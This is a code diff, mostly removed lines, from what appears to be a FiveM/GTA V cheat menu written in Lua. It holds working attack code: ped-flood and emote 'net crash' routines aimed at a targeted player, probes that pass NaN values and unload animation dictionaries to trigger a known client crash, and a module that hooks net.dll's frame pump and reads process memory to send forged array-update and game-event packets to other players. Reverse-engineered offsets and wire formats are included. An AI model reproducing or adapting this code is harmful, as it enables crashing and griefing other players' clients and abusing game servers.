-                    pcall(TaskPlayAnim, me, dict, SELF_EMOTE.names[ai],
-                        b[1], b[2], -1, 49, 0, false, false, false)
-                    n = n + 1
-                    Citizen.Wait(90)
-                end
-            end
-        end
-        O.log("net crash: instant emote %d tasks", n)
-        pcall(Notify, ("Net crash: instant emote, %d tasks"):format(n))
-    end)
-    return true
-end
-
--- ---------------------------------------------------------------------------
--- Crawl probe
---
--- What the dump actually proves: at FiveM_b3751_GTAProcess.exe+0x31194B,
---   mov rax, [rdi+0x268]        ; old value of a refcounted pointer
---   or  word ptr [rax+0x214], 20h
--- crashed with RAX = 0xC0800000, i.e. float -4.0f sitting where a pointer
--- belongs, then
---   mov rcx, [rdi+268h] / dec [rcx+210h] / jae / call [rax]   ; release
---   mov [rdi+268h], rbx / inc [rbx+210h]                      ; assign
--- That is an intrusive refcount assignment whose old value was a float.
--- The trampoline that wrote it was a task/clip pointer field, so the
--- primitive is "a float handed to a native that stores it in a pointer
--- slot". Nothing in FiveM can patch that: it is GTA's own layout, not a
--- network event.
---
--- Ten candidate call shapes reproduce the pose (move_crawl/onfront_fwd)
--- and differ in which argument carries -4.0. One press runs one probe and
--- advances; the client dying on probe N names the primitive.
--- ---------------------------------------------------------------------------
-C.crawlIndex = 0
-C.crawlProbes = {
-    { name = "dict unload mid task", run = function(me)
-        TaskPlayAnim(me, "move_crawl", "onfront_fwd", 8.0, -8.0, -1, 1, 0.0, false, false, false)
-        Citizen.Wait(30)
-        for i = 1, 4 do RemoveAnimDict("move_crawl") end
-    end },
-    { name = "dict unload then play", run = function(me)
-        RequestAnimDict("move_crawl")
-        local t = GetGameTimer() + 1500
-        while not HasAnimDictLoaded("move_crawl") and GetGameTimer() < t do Citizen.Wait(0) end
-        for i = 1, 3 do RemoveAnimDict("move_crawl") end
-        TaskPlayAnim(me, "move_crawl", "onfront_fwd", 8.0, -8.0, -1, 1, 0.0, false, false, false)
-    end },
-    { name = "dict refcount race 200", run = function(me)
-        for i = 1, 200 do
-            RequestAnimDict("move_crawl")
-            RemoveAnimDict("move_crawl")
-        end
-        TaskPlayAnim(me, "move_crawl", "onfront_fwd", 8.0, -8.0, -1, 1, 0.0, false, false, false)
-    end },
-    { name = "set unload mid clipset", run = function(me)
-        SetPedMovementClipset(me, "move_crawl", 1.0)
-        Citizen.Wait(30)
-        for i = 1, 4 do RemoveAnimSet("move_crawl") end
-    end },
-    { name = "set unload then clipset", run = function(me)
-        RequestAnimSet("move_crawl")
-        local t = GetGameTimer() + 1500
-        while not HasAnimSetLoaded("move_crawl") and GetGameTimer() < t do Citizen.Wait(0) end
-        for i = 1, 3 do RemoveAnimSet("move_crawl") end
-        SetPedMovementClipset(me, "move_crawl", 1.0)
-    end },
-    { name = "clear task mid unload", run = function(me)
-        TaskPlayAnim(me, "move_crawl", "onfront_fwd", 8.0, -8.0, -1, 1, 0.0, false, false, false)
-        RemoveAnimDict("move_crawl")
-        ClearPedTasksImmediately(me)
-        TaskPlayAnim(me, "move_crawl", "onfront_fwd", 8.0, -8.0, -1, 1, 0.0, false, false, false)
-    end },
-    { name = "prone dict unload", run = function(me)
-        TaskPlayAnim(me, "move_crawlprone2crawlfront", "front", 8.0, -8.0, -1, 1, 0.0, false, false, false)
-        Citizen.Wait(25)
-        for i = 1, 4 do RemoveAnimDict("move_crawlprone2crawlfront") end
-    end },
-    { name = "ragdoll then unload", run = function(me)
-        TaskPlayAnim(me, "move_crawl", "onfront_fwd", 8.0, -8.0, -1, 1, 0.0, false, false, false)
-        SetPedCanRagdoll(me, true)
-        SetPedToRagdoll(me, 3000, 3000, 0, false, false, false)
-        Citizen.Wait(20)
-        for i = 1, 4 do RemoveAnimDict("move_crawl"); RemoveAnimSet("move_crawl") end
-    end },
-    { name = "nan coords", run = function(me)
-        SetEntityCoords(me, 0.0 / 0.0, 0.0 / 0.0, 0.0 / 0.0, false, false, false, true)
-    end },
-    { name = "nan velocity", run = function(me)
-        SetEntityVelocity(me, 0.0 / 0.0, 0.0 / 0.0, 0.0 / 0.0)
-    end },
-    { name = "clone attach delete", run = function(me)
-        local c = ClonePed(me, false, false, true)
-        if c and c ~= 0 then
-            AttachEntityToEntity(c, me, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
-            Citizen.Wait(20)
-            DeleteEntity(c)
-        end
-    end },
-}
-function C.crawlProbe()
-    local stamp = now()
-    if C.probeAt and stamp - C.probeAt < 1500 then return false end
-    C.probeAt = stamp
-    local me = PlayerPedId()
-    if type(me) ~= "number" or me == 0 then return false end
-    C.crawlIndex = (C.crawlIndex % #C.crawlProbes) + 1
-    local probe = C.crawlProbes[C.crawlIndex]
-    pcall(RequestAnimDict, "move_crawl")
-    pcall(RequestAnimDict, "move_crawlprone2crawlfront")
-    pcall(RequestAnimSet, "move_crawl")
-    local t = GetGameTimer() + 1500
-    while not HasAnimDictLoaded("move_crawl") and GetGameTimer() < t do
-        Citizen.Wait(10)
-    end
-    pcall(ClearPedTasksImmediately, me)
-    Citizen.Wait(40)
-    local ok, err = pcall(probe.run, me)
-    O.log("crawl probe %d/%d %s ok=%s err=%s",
-          C.crawlIndex, #C.crawlProbes, probe.name, tostring(ok), tostring(err))
-    pcall(Notify, ("Crawl probe %d/%d: %s"):format(C.crawlIndex, #C.crawlProbes, probe.name))
-    return ok
 end
 
 function C.launch(kind)
     if C.running then
         O.log("crash: already running")
-        return false
-    end
-
-    -- Anti-spam: a second flood inside the cooldown would stack a new 110-ped
-    -- wave while the previous one is still being streamed to the operator.
-    -- One flood at a time, then a pause long enough for the local entity
-    -- manager to release the previous wave.
-    if now() < (C.cooldownUntil or 0) then
-        O.log("crash: cooling down")
         return false
     end
 
@@ -21383,47 +20979,22 @@ function C.launch(kind)
         return false
     end
 
-    -- Green-crash gate. Below 250 m the operator renders the swarm and the
-    -- impacts; the reference refuses the crash there for that reason.
-    if kind == "ped" and target.dist < PED.minDist then
-        O.log("crash: target %.0f m, need %.0f m â€” move back", target.dist, PED.minDist)
-        pcall(Notify, ("Ped flood: target %.0f m â€” move back to %.0f m"):format(
-            target.dist, PED.minDist))
-        return false
-    end
-
     C.kind = kind
     C.running = true
     C.created = {}
     C.ambient = {}
-    C.props = {}
-    C.volley = 0
     C.targetPed = target.ped
     C.targetDist = target.dist
-    local okSid, sid = pcall(GetPlayerServerId, target.player)
-    C.targetSid = (okSid and type(sid) == "number" and sid >= 0) and sid or nil
     C.opDist = target.dist
-    C.stats = { created = 0, props = 0, networked = 0, scenarios = 0, emotes = 0, waves = 0, fails = 0, control = 0 }
+    C.stats = { created = 0, scenarios = 0, emotes = 0, waves = 0, fails = 0, control = 0 }
 
     Citizen.CreateThread(function()
-        if kind == "ped" then
-            -- Idle baseline before the swarm exists. 700 ms of frames.
-            local frames, t0 = 0, now()
-            while now() - t0 < 700 do
-                Citizen.Wait(0)
-                frames = frames + 1
-            end
-            C.fpsBase = frames * 1000.0 / math.max(1, now() - t0)
-            pcall(applyShield)
-            pcall(startFpsWatch)
-        end
         local ok, err = pcall(runBody, kind, target)
         if not ok then
             O.log("crash: %s", tostring(err))
         end
         C.running = false
         C.cleanup()
-        C.cooldownUntil = now() + 6000
         O.log("crash: done %d created, %d scenarios, %d emotes, %d waves, %d fails",
             C.stats.created, C.stats.scenarios, C.stats.emotes, C.stats.waves, C.stats.fails)
     end)
@@ -22183,2214 +21754,6 @@ end
 return G
 
 end)(O,S)
-
--- ---------------------------------------------------------------------------
--- PART: 28_net_link.lua
--- ---------------------------------------------------------------------------
--- Network lane: one record per game frame through the engine's own reliable
--- command send path, plus synthetic damage events.
---
--- THREAD MODEL
---   A direct call to NetLibrary::SendReliableCommand from the Susano thread
---   walks the reliable send ring while the frame pump is also using it. The
---   b3751 ring-dequeue dump is that race:
---
---       FiveM_b3751_GTAProcess.exe+0x13421F6
---       mov rax, [rcx]        ; ring entry
---       ...
---       call [rax+0x10]
---
---   The safe route is the frame pump itself. gta-net-five.dll imports
---   ?RunMainFrame@NetLibrary@@QEAAXXZ from net.dll and reaches it through the
---   IAT thunk at gta-net-five.dll+0xB3F3E. The two call sites are:
---
---       0x18006F4C1  frame event path
---       0x180077130  main frame pump
---
---   The hook is installed on net.dll+0x4C110 (verified export, not a pattern)
---   and fires on the game thread. The callback returns nil, so the original
---   RunMainFrame still runs: the lane adds one send and never suppresses the
---   engine's own frame work.
---
--- WIRE FORMAT (msgArrayUpdate, rebuilt from the engine sender 0x1800495D9)
---   uint32 messageHash   (0x0976E783, rage hash of the message name)
---   uint8  arrayIndex
---   uint16 element
---   uint16 byteSize
---   uint8  body[byteSize]
---
---   element 0..49 (the server rejects 50 and above), byteSize 0..128,
---   byteSize 0 frees the element. Array 4 is the incident array, array 7 the
---   sticky-bomb array.
---
--- RATE
---   The server accepts 75 updates per second sustained and 125 in a burst.
---   The callback counts a one-second window and stops at 70, so two frame
---   call sites (120 calls/s) still stay under the sustained ceiling.
---
--- INSTANCE
---   NetLibrary is located in net.dll .data by matching the object's first
---   qword against the ??_7NetLibrary vtable and +0x48 against the connected
---   state. No pattern scan, no signature that a build can silently poison.
---   If the object cannot be verified, nothing is sent and the lane stays off.
--- ---------------------------------------------------------------------------
-local NET = (function(O, C)
-    local NET = {}
-
-    NET.base = nil
-    NET.sendFn = nil
-    NET.vtable = nil
-    NET.instance = nil
-    NET.typeBuf = nil
-    NET.dataBuf = nil
-    NET.hookId = nil
-    NET.queue = nil
-    NET.busy = false
-    NET.armed = false
-    NET.sent = 0
-    NET.frame = 0
-    NET.aborted = nil
-    NET.lastDamage = 0
-    NET.releasePending = false
-    NET.seen = nil
-    NET.sniffCount = 0
-    NET.mutated = 0
-    NET.windowStart = 0
-    NET.windowCount = 0
-
-    local HASH = 0x0976E783
-    local VT_RVA = 0x96A28
-    local RUN_RVA = 0x4C110
-    local SEND_RVA = 0x4C5C0
-    local RUN_NAME = "?RunMainFrame@NetLibrary@@QEAAXXZ"
-    local VT_NAME = "??_7NetLibrary@@6BINetLibrary@@@"
-    local SEND_NAME = "?SendReliablePacket@NetLibrary@@QEAAXIPEBD_K@Z"
-    local CONNECTED = 8
-    local MAX_ELEM = 49
-    local MAX_TOKEN = 70
-    local WINDOW_MS = 1000
-    local HEADER = 9
-
-    local profiles = {
-        { size = 1, fill = 0x00 },
-        { size = 1, fill = 0xFF },
-        { size = 16, fill = 0x00 },
-        { size = 16, fill = 0xFF },
-        { size = 128, fill = 0x00 },
-        { size = 128, fill = 0xFF },
-        { size = 128, fill = 0x7F },
-    }
-
-    local function mem()
-        if type(Susano) ~= "table" then return nil end
-        return Susano.Memory
-    end
-
-    local function is_valid(addr)
-        if type(addr) ~= "number" or addr == 0 then return false end
-        local m = mem()
-        if not m or type(m.Valid) ~= "function" then return false end
-        local ok, res = pcall(m.Valid, addr)
-        return ok and res == true
-    end
-
-    local function read_u8(addr)
-        local m = mem()
-        if not m or type(m.ReadU8) ~= "function" or not is_valid(addr) then return nil end
-        local ok, res = pcall(m.ReadU8, addr)
-        if not ok or type(res) ~= "number" then return nil end
-        return res
-    end
-
-    local function read_u16(addr)
-        local m = mem()
-        if not m or type(m.ReadU16) ~= "function" or not is_valid(addr) then return nil end
-        local ok, res = pcall(m.ReadU16, addr)
-        if not ok or type(res) ~= "number" then return nil end
-        return res
-    end
-
-    local function read_u32(addr)
-        local m = mem()
-        if not m or type(m.ReadU32) ~= "function" or not is_valid(addr) then return nil end
-        local ok, res = pcall(m.ReadU32, addr)
-        if not ok or type(res) ~= "number" then return nil end
-        return res
-    end
-
-    local function read_u64(addr)
-        local m = mem()
-        if not m or type(m.ReadU64) ~= "function" or not is_valid(addr) then return nil end
-        local ok, res = pcall(m.ReadU64, addr)
-        if not ok or type(res) ~= "number" then return nil end
-        return res
-    end
-
-    local function raw_u64(addr)
-        local m = mem()
-        if not m or type(m.ReadU64) ~= "function" then return nil end
-        local ok, res = pcall(m.ReadU64, addr)
-        if not ok or type(res) ~= "number" then return nil end
-        return res
-    end
-
-    local function section_name(entry)
-        local m = mem()
-        if not m or type(m.ReadU8) ~= "function" then return "" end
-        local out = {}
-        for i = 0, 7 do
-            local ok, v = pcall(m.ReadU8, entry + i)
-            if not ok or type(v) ~= "number" or v == 0 then break end
-            out[#out + 1] = string.char(v)
-        end
-        return table.concat(out)
-    end
-
-    local function bytes_of_u64(v)
-        local b = {}
-        for i = 1, 8 do
-            b[i] = string.char(v % 256)
-            v = math.floor(v / 256)
-        end
-        return table.concat(b)
-    end
-
-    -- Chunked scan. The previous version stepped by 0x1000 and only tested
-    -- page-aligned addresses, so a NetLibrary object sitting at an arbitrary
-    -- offset inside .data was never found ("no NetLibrary instance").
-    -- ReadBytes in 8 KiB blocks + plain string.find is fast enough to walk
-    -- the whole image and checks every byte offset.
-    local function scan(base, va, size, want_vt)
-        if type(size) ~= "number" or size <= 0 or size > 0x2000000 then return nil end
-        local m = mem()
-        if not m or type(m.ReadBytes) ~= "function" then return nil end
-        local pat = bytes_of_u64(want_vt)
-        local start = base + va
-        local chunk = 0x2000
-        local off = 0
-        local carry = ""
-        while off < size do
-            local n = math.min(chunk, size - off)
-            local ok, buf = pcall(m.ReadBytes, start + off, n)
-            if ok and type(buf) == "table" and #buf > 0 then
-                local parts = {}
-                for i = 1, #buf do parts[i] = string.char(buf[i] % 256) end
-                local data = carry .. table.concat(parts)
-                local origin = start + off - #carry
-                local pos = 1
-                while true do
-                    local f = data:find(pat, pos, true)
-                    if not f then break end
-                    local addr = origin + (f - 1)
-                    if addr >= start and raw_u64(addr) == want_vt
-                       and read_u32(addr + 0x48) == CONNECTED then
-                        return addr
-                    end
-                    pos = f + 1
-                end
-                carry = data:sub(-7)
-                off = off + n
-            else
-                off = off + n
-            end
-        end
-        return nil
-    end
-
-    function NET.init()
-        local m = mem()
-        if not m then return false end
-        for _, name in ipairs({
-            "Valid", "ReadU8", "ReadU16", "ReadU32", "ReadU64",
-            "WriteBytes", "GetProc", "Module", "Hook", "Unhook", "Call", "Alloc",
-        }) do
-            if type(m[name]) ~= "function" then return false end
-        end
-        if NET.sendFn and NET.vtable and NET.dataBuf and NET.bigBuf then return true end
-
-        local okb, base = pcall(m.Module, "net.dll")
-        if not okb or type(base) ~= "number" or base == 0 then return false end
-        NET.base = base
-
-        local okv, vt = pcall(m.GetProc, "net.dll", VT_NAME)
-        if not okv or type(vt) ~= "number" or vt == 0 then vt = base + VT_RVA end
-        NET.vtable = vt
-
-        local oks, send = pcall(m.GetProc, "net.dll", SEND_NAME)
-        if not oks or type(send) ~= "number" or send == 0 then send = base + SEND_RVA end
-        NET.sendFn = send
-
-        local okd, dataBuf = pcall(m.Alloc, 160)
-        if not okd or type(dataBuf) ~= "number" or dataBuf == 0 then return false end
-        NET.dataBuf = dataBuf
-        local okb2, bigBuf = pcall(m.Alloc, 2048)
-        if not okb2 or type(bigBuf) ~= "number" or bigBuf == 0 then return false end
-        NET.bigBuf = bigBuf
-        NET.typeBuf = nil
-        return true
-    end
-
-    -- NetLibrary::Create() caches the live instance in a process global.
-    --   qword_1800E7A38  ->  net.dll + 0xE7A38   (.data)
-    -- Verified in IDA 9.5 / Hex-Rays on net.dll (build 3751):
-    --   * Create() stores the new NetLibrary there under the MSVC
-    --     thread-safe-init guard (dword_1800E7A40).
-    --   * sub_18003A7F0 reads that same global and writes this+0x3C/+0x44,
-    --     i.e. it is used as a NetLibrary*.
-    --   * NetLibrary::GetConnectionState returns [this+0x48].
-    -- Reading the global beats every heuristic scan: no false positives.
-    NET.SINGLETON_RVA = 0xE7A38
-
-    function NET.find_instance()
-        local function fail(why, v)
-            if not NET.diagFail then
-                NET.diagFail = true
-                O.log("net diag fail: %s value=%s base=%s vt=%s",
-                      tostring(why), tostring(v),
-                      tostring(NET.base), tostring(NET.vtable))
-            end
-            return nil
-        end
-        local base = NET.base
-        if type(base) ~= "number" or base == 0 then return fail("base", base) end
-
-        local inst = read_u64(base + NET.SINGLETON_RVA)
-        if type(inst) ~= "number" or inst < 0x10000 then
-            return fail("singleton", inst)
-        end
-
-        local vt = NET.vtable
-        local got_vt = read_u64(inst)
-        if type(vt) == "number" and vt ~= 0 and got_vt ~= vt then
-            return fail("vt_mismatch", string.format("0x%X!=0x%X", got_vt or 0, vt))
-        end
-
-        local impl = read_u64(inst + 0x20)
-        local refs = read_u64(inst + 0x28)
-        if type(impl) ~= "number" or impl < 0x10000 then
-            return fail("impl", impl)
-        end
-        if type(refs) ~= "number" or refs < 0x10000 then
-            return fail("refs", refs)
-        end
-
-        local state = read_u32(inst + 0x48)
-        if not NET.diag then
-            NET.diag = true
-            O.log("net diag: base=0x%X inst=0x%X vt=0x%X impl=0x%X refs=0x%X state=%s",
-                  base, inst, got_vt or 0, impl, refs, tostring(state))
-        end
-        -- [inst+0x48] is not the connection state in b3751 (observed
-        -- 0x416A26 on a live, working instance). Kept in the diag line only.
-        return inst
-    end
-
-    function NET.resolve_instance()
-        local inst = NET.find_instance()
-        if not inst then
-            NET.instance = nil
-            return nil
-        end
-        NET.instance = inst
-        return inst
-    end
-
-    local function token_ok()
-        -- This runs inside the RunMainFrame hook. Calling a game native from a
-        -- hook callback deadlocks the thread running the hook, so the rate
-        -- limit is counted in frames and reset per NET call instead of using
-        -- GetGameTimer().
-        NET.windowCount = (NET.windowCount or 0) + 1
-        if NET.windowCount > MAX_TOKEN then return false end
-        return true
-    end
-
-    local function send(inst, item)
-        local m = mem()
-        if not m then return false end
-        if item.raw then
-            local buf = NET.bigBuf
-            if type(buf) ~= "number" or buf == 0 then return false end
-            local okw, wrote = pcall(m.WriteBytes, buf, item.bytes)
-            if not okw or wrote == false then return false end
-            local okc = pcall(m.Call, NET.sendFn, "v:pipl", inst, item.hash, buf, #item.bytes)
-            return okc and true or false
-        end
-        local bytes = {
-            HASH % 256,
-            math.floor(HASH / 256) % 256,
-            math.floor(HASH / 65536) % 256,
-            math.floor(HASH / 16777216) % 256,
-            item[1] % 256,
-            item[2] % 256, math.floor(item[2] / 256),
-            item[4] % 256, math.floor(item[4] / 256),
-        }
-        local data = item[3]
-        for i = 1, item[4] do bytes[HEADER + i] = data[i] end
-        local okw, wrote = pcall(m.WriteBytes, NET.dataBuf, bytes)
-        if not okw or wrote == false then return false end
-        local okc = pcall(m.Call, NET.sendFn, "v:pipl", inst, HASH, NET.dataBuf, #bytes)
-        if not okc then return false end
-        return true
-    end
-
-    local abort
-
-    local function request_release()
-        NET.releasePending = true
-    end
-
-    local function unhook_now()
-        local m = mem()
-        if NET.hookId ~= nil and m and type(m.Unhook) == "function" then
-            pcall(m.Unhook, NET.hookId)
-        end
-        NET.hookId = nil
-        NET.releasePending = false
-    end
-
-    local function flush()
-        if not NET.armed then return nil end
-        NET.frame = NET.frame + 1
-        local item = NET.queue and NET.queue[1]
-        if not item then NET.armed = false; return nil end
-        if not token_ok() then return nil end
-        local inst = NET.instance
-        if type(inst) ~= "number" or inst == 0
-            or raw_u64(inst) ~= NET.vtable
-            or read_u32(inst + 0x48) ~= CONNECTED then
-            abort("instance lost")
-            return nil
-        end
-        if not send(inst, item) then
-            abort("send rejected")
-            return nil
-        end
-        table.remove(NET.queue, 1)
-        NET.sent = NET.sent + 1
-        if #NET.queue == 0 then
-            NET.armed = false
-            request_release()
-            NET.busy = false
-        end
-        return nil
-    end
-
-    local function guarded()
-        local ok, err = pcall(flush)
-        if not ok then abort("flush error: " .. tostring(err)) end
-        return nil
-    end
-
-    abort = function(reason)
-        if NET.aborted then return end
-        NET.aborted = tostring(reason)
-        NET.armed = false
-        NET.queue = nil
-        request_release()
-    end
-
-    local function install_hook(addr, sig, callback)
-        local m = mem()
-        if not m or type(addr) ~= "number" or addr == 0 then return false end
-        if NET.hookId ~= nil then return false end
-        local okh, id = pcall(m.Hook, addr, sig, callback)
-        if not okh or type(id) ~= "number" then return false end
-        NET.hookId = id
-        return true
-    end
-
-    local function ensure_hook()
-        if NET.hookId ~= nil then return true end
-        local m = mem()
-        if not m then return false end
-        local addr = nil
-        local okp, p = pcall(m.GetProc, "net.dll", RUN_NAME)
-        if okp and type(p) == "number" and p ~= 0 then addr = p end
-        if not addr then
-            local base = NET.base
-            if type(base) == "number" and base ~= 0 then addr = base + RUN_RVA end
-        end
-        if type(addr) ~= "number" or addr == 0 then return false end
-        local okh, id = pcall(m.Hook, addr, "v:p", guarded)
-        if not okh or type(id) ~= "number" then return false end
-        NET.hookId = id
-        return true
-    end
-
-    local function build_queue(kind, targeted)
-        local targets = {}
-        if targeted and NET.seen then
-            for _, pair in pairs(NET.seen) do
-                if type(pair) == "table" and type(pair[2]) == "number" then
-                    targets[#targets + 1] = { pair[1], pair[2] }
-                end
-            end
-        end
-        if #targets == 0 then
-            for elem = 0, MAX_ELEM do
-                targets[#targets + 1] = { kind, elem }
-            end
-        end
-        local q = {}
-        for p = 1, #profiles do
-            local profile = profiles[p]
-            local data = {}
-            for i = 1, profile.size do data[i] = profile.fill end
-            for t = 1, #targets do
-                local pair = targets[t]
-                q[#q + 1] = { pair[1] or kind, pair[2], data, profile.size }
-            end
-        end
-        return q
-    end
-
-    function NET.start(kind, targeted)
-        if type(kind) ~= "number" then return false end
-        if NET.busy or NET.releasePending then O.log("net: lane busy"); return false end
-        if not NET.init() then O.log("net: net.dll not ready"); return false end
-        if not NET.resolve_instance() then O.log("net: no NetLibrary instance"); return false end
-        if not ensure_hook() then O.log("net: RunMainFrame hook failed"); return false end
-        NET.queue = build_queue(kind, targeted)
-        NET.sent = 0
-        NET.frame = 0
-        NET.aborted = nil
-        NET.windowStart = GetGameTimer()
-        NET.windowCount = 0
-        NET.busy = true
-        NET.armed = true
-        local expected = #NET.queue
-        Citizen.CreateThread(function()
-            local deadline = GetGameTimer() + 30000
-            while NET.armed and GetGameTimer() < deadline do Citizen.Wait(100) end
-            if NET.armed then abort("timeout") end
-            Citizen.Wait(60)
-            if NET.releasePending then unhook_now() end
-            NET.busy = false
-            if NET.aborted then
-                O.log("net: %s after %d/%d", NET.aborted, NET.sent, expected)
-            else
-                O.log("net: array %d sent %d", kind, NET.sent)
-            end
-        end)
-        return true
-    end
-
-    function NET.stop()
-        abort("stopped")
-    end
-
-    -- RAGE msgNetGameEventV2 (net::packet::ClientNetGameEventV2Packet):
-    --   u32 type = 0x2B513E19 (HashRageString "msgNetGameEventV2")
-    --   u8  targetCount
-    --   u16 targetNetId * targetCount
-    --   u32 eventNameHash
-    --   u16 eventId
-    --   u8  isReply
-    --   u8  data[...]   (ConstrainedStreamTail 0..1025)
-    --
-    -- The server (NetGameEventPacketHandlerV2) rate-limits at 200/s, drops the
-    -- event if IsNetGameEventBlocked(eventNameHash) matches a server.cfg
-    -- block_net_game_event, filters targets to a relevant client in the same
-    -- routing bucket, and otherwise relays the packet to those targets.
-    local function pack_event(netIds, eventHash, eventId, dataBytes, tail16)
-        local b = {}
-        local function u16(v)
-            v = v % 65536
-            b[#b + 1] = v % 256
-            b[#b + 1] = math.floor(v / 256) % 256
-        end
-        local function u32(v)
-            u16(v % 65536)
-            u16(math.floor(v / 65536) % 65536)
-        end
-        -- Byte for byte the layout gta-net-five writes before it hands the
-        -- buffer to net.dll. Read straight off the serializer at 0x1800898E0
-        -- in the shipped DLL (plaintext .text, so no guessing was needed):
-        --
-        --   0x18008995C  mov eax,[rsi]        ; u32 field, also passed to the
-        --   0x180089963  mov [rcx],eax        ;   send call as the second arg
-        --   0x180089972  call 18004FC00       ; u8 count, then count * u16
-        --   0x1800899A3  mov word [r9+rdx],ax ; u16 [rsi+0x18]
-        --   0x1800899B9  mov byte [r8+rdx],al ; u8  [rsi+0x1a]
-        --   0x1800899C6  mov word [r10+rdx],ax; u16 [rsi+0x1c]
-        --   0x1800899E0  mov word [r9+rdx],ax ; u16 [rsi+0x28] = data length
-        --   0x180089A02  call memcpy           ; [rsi+0x20], length bytes
-        --
-        -- The first u32 is the event name hash, which is exactly the key the
-        -- dispatcher looks up (F26), and it is also the value the send call
-        -- receives. 0x2B513E19 is the net message type and belongs to the call,
-        -- not to the buffer: writing it into the buffer shifted every field by
-        -- four bytes, the hash lookup missed, and the receiver dropped the
-        -- packet without a word. That is why every send from r18 and r19
-        -- reported ok=true and nothing ever happened.
-        u32(eventHash or 0)
-        b[#b + 1] = #netIds % 256
-        for i = 1, #netIds do u16(netIds[i]) end
-        u16(eventId or 0)
-        b[#b + 1] = 0
-        u16(tail16 or 0)
-        u16(#dataBytes)
-        for i = 1, #dataBytes do b[#b + 1] = dataBytes[i] % 256 end
-        return b
-    end
-
-    -- Send through gta-net-five's own serializer: sub_1800897C0(this, event, reliable).
-    --
-    -- Re-packing the envelope by hand is what r18 and r19 got wrong, and r20 is
-    -- only as good as the reading of the writer. This path removes the doubt
-    -- entirely: the game builds the buffer, picks the channel, and calls into
-    -- net.dll itself. The only thing supplied here is the event object, whose
-    -- layout is read straight out of the writer:
-    --
-    --   +0x00 u32  event name hash
-    --   +0x08 ptr  u16 target array
-    --   +0x10 u64  target count (writer takes the low byte)
-    --   +0x18 u16  event id
-    --   +0x1a u8   isReply
-    --   +0x1c u16  unknown
-    --   +0x20 ptr  payload
-    --   +0x28 u64  payload length (writer refuses above 0x401)
-    local GST_SEND_RVA = 0x897C0
-
-    function NET.gtafive()
-        local m = mem()
-        if not m then return nil end
-        local ok, g = pcall(m.Module, "gta-net-five.dll")
-        if ok and type(g) == "number" and g > 0 then return g end
-        return nil
-    end
-
-    function NET.nativeSend(netIds, eventHash, eventId, dataBytes, tail16)
-        local m = mem()
-        if not m then return false end
-        if type(netIds) ~= "table" or #netIds == 0 then return false end
-        local gb = NET.gtafive()
-        if not gb then O.log("net native: gta-net-five not loaded"); return false end
-        if not NET.init() then return false end
-        local inst = NET.resolve_instance()
-        if not inst then O.log("net native: no NetLibrary instance"); return false end
-        if not NET.natBuf then
-            local okb, b = pcall(m.Alloc, 0x400)
-            if not okb or type(b) ~= "number" or b == 0 then return false end
-            NET.natBuf = b
-        end
-        local base = NET.natBuf
-        local count = #netIds
-        local data = dataBytes or {}
-        if #data > 0x401 then return false end
-
-        local targets = {}
-        for i = 1, count do
-            local v = netIds[i] % 65536
-            targets[#targets + 1] = v % 256
-            targets[#targets + 1] = math.floor(v / 256) % 256
-        end
-
-        local sb = {}
-        for i = 1, 0x40 do sb[i] = 0 end
-        local function u8(off, v) sb[off + 1] = v % 256 end
-        local function u16(off, v)
-            u8(off, v % 256); u8(off + 1, math.floor(v / 256) % 256)
-        end
-        local function u64(off, v)
-            for i = 0, 7 do
-                sb[off + i + 1] = v % 256
-                v = math.floor(v / 256)
-            end
-        end
-        u16(0x00, (eventHash or 0) % 65536)
-        u16(0x02, math.floor((eventHash or 0) / 65536) % 65536)
-        u64(0x08, base + 0x40)
-        u64(0x10, count)
-        u16(0x18, eventId or 0)
-        u8(0x1A, 0)
-        u16(0x1C, tail16 or 0)
-        u64(0x20, base + 0x80)
-        u64(0x28, #data)
-
-        local okw = pcall(m.WriteBytes, base, sb)
-        if not okw then return false end
-        if #targets > 0 then
-            pcall(m.WriteBytes, base + 0x40, targets)
-        end
-        if #data > 0 then
-            pcall(m.WriteBytes, base + 0x80, data)
-        end
-        -- sub_1800897C0 returns al = 1 when it actually handed a buffer to
-        -- net.dll and 0 on every refusal path (throttled to one send per tick,
-        -- buffer too small, not connected). Reading that byte is the first real
-        -- signal we get: everything up to now reported the pcall succeeding,
-        -- which only ever meant "the call did not throw".
-        local okc, ret = pcall(m.Call, gb + GST_SEND_RVA, "i:ppi", inst, base, 1)
-        if not okc then
-            pcall(m.Call, gb + GST_SEND_RVA, "v:ppi", inst, base, 1)
-            return false, "call"
-        end
-        return (type(ret) == "number" and ret ~= 0), ret
-    end
-
-    function NET.emitEvent(netIds, eventHash, eventId, dataBytes, tail16)
-        if type(netIds) ~= "table" then return false end
-        if NET.nativeMode then
-            local ok, ret = NET.nativeSend(netIds, eventHash, eventId, dataBytes, tail16)
-            O.log("net event: native ok=%s ret=%s targets=%d",
-                  tostring(ok), tostring(ret), #netIds)
-            return ok
-        end
-        if NET.busy or NET.releasePending then return false end
-        if not NET.init() then O.log("net event: net.dll not ready"); return false end
-        local inst = NET.resolve_instance()
-        if not inst then O.log("net event: no NetLibrary instance"); return false end
-        NET.busy = true
-        NET.queue = { { raw = true, hash = 0x2B513E19,
-                        bytes = pack_event(netIds, eventHash, eventId, dataBytes or {}, tail16) } }
-        local item = NET.queue[1]
-        NET.queue = {}
-        local ok = false
-        local pok, err = pcall(function()
-            ok = send(inst, item)
-        end)
-        NET.busy = false
-        O.log("net event: send ok=%s res=%s err=%s", tostring(pok), tostring(ok), tostring(pok and "nil" or err))
-        return ok
-    end
-
-    -- Event registry dump (gta-net-five.dll, build 3751).
-    --
-    -- Proven in IDA on gta-net-five.dll:
-    --   qword_1802043C0  -> base used for the handler table
-    --   qword_1802052C8  -> delta applied in the range check
-    --                       ( fn in [q+0x140000000, q+0x146000000) )
-    --   sub_1800904B0    -> builds a std::vector<u32> of event name hashes
-    --                       at qword_1802045B0 = {begin, end, cap}
-    --   sub_18008DD60    -> fn = *(base + OFF + 8*index), OFF in
-    --                       {0x3B3D0, 0x3AB80, 0x3AFD0}
-    -- index == eventId used on the wire.
-    local REG_HASH_VEC = 0x2045B0
-    local REG_BASE_PTR = 0x2043C0
-    local REG_GTA_DELTA = 0x2052C8
-    local REG_OFFSETS = { 0x3B3D0, 0x3AB80, 0x3AFD0 }
-
-    local function in_gta(fn, gbase)
-        return type(fn) == "number" and fn >= gbase and fn < gbase + 0x6000000
-    end
-
-    function NET.regTable()
-        local m = mem()
-        if not m then return nil, "no memory api" end
-        if not NET.init() then return nil, "net.dll not ready" end
-        local okg, g = pcall(m.Module, "gta-net-five.dll")
